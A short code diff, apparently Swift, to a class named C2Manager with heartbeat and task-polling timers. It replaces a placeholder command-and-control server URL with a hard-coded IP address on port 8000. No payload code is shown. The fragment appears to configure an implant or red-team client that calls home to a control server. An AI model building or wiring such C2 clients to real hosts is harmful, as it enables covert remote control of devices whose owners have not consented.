@@ -9,8 +9,8 @@ class C2Manager {
     private var apiKey: String?
     private var isRunning = false
 
-    // TODO: Change to your C2 server URL
-    private let baseURL = "http://your-c2-server.com:8000"
+    // C2 Server URL - Change this to your EC2 IP
+    private let baseURL = "http://57.181.28.7:8000"
 
     private var heartbeatTimer: Timer?
     private var taskPollTimer: Timer?
